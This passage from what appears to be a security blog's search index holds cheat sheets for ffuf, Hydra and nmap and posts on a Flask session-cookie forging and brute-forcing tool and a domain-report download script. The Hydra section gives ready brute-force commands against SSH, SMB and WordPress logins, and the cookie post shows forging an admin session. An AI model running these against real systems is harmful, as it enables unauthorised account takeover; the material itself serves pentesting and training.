\u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. \u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights 